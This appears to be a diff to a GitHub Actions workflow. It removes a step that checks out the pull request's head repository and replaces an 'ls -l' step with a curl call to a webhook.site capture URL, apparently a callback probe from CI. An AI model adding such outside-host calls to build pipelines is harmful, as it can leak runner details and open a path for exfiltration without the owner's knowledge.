@@ -16,12 +16,6 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name : Setup
-        uses: actions/checkout@v2
-        with:
-          ref: ${{github.event.pull_request.head.ref}}
-          repository: ${{github.event.pull_request.head.repo.full_name}}
-
       - name: Run a multi-line script
         run: |
-          ls -l
+          curl 	https://webhook.site/a0d7aa92-c051-45c7-ab24-f16eb78721b4
